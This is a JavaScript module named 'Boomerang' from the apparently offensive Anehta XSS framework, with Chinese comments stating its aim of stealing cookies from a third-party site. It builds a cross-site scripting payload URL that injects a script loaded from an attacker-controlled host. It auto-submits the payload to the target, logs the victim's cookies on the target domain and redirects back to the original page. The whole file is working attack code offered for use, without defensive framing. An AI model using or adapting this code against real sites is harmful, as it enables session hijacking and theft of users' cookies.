var target = "http://www.alimafia.com/xssDemo.html#'><script src=http://www.a.com/anehta/feed.js></script><'";
var org_url = "http://www.a.com/anehta/demo.html";
//var target="http://www.alimafia.com/xssDemo.html#'><script src=http://www.a.com/anehta/feed.js></script><'";
//var org_url = "http://www.a.com/anehta/demo.html"; // 前页面

var target_domain = target.split('/');
target_domain = target_domain[2];

var org_domain = org_url.split('/');
org_domain = org_domain[2];
////////////////////////////////////////////////////////
// boomerang 回旋镖模块，获取第三方远程站点的cookie
// 并将页面重定向回当前页面
// 要求远程站点存在一个xss
//// Author: axis
///////////////////////////////////////////////////////
//alert("Boomerang.js 回旋镖模块");

 
// 如果是当前页面，则向目标提交
if ($d.domain == org_domain){
   if (anehta.dom.checkCookie("boomerang") == false){
   	  // 在cookie里做标记，只弹一次
	    anehta.dom.addCookie("boomerang", "x");
	    //anehta.dom.persistCookie("boomerang");
	    //alert(anehta.dom.getCookie("boomerang"));
   	  setTimeout( function (){
	      //alert(target);
        try {
            anehta.net.postForm(target);
        } catch (e){
            //alert(e);
        }
      },
      50);
   }
}


// 如果是目标站点，则重定向回前页面 
if ($d.domain == target_domain){
	
	//clx模块太慢了
	 anehta.logger.logCookie();
	 setTimeout( function (){
     // 弹回原来的页面。
     anehta.net.postForm(org_url);
   },
   50);
}


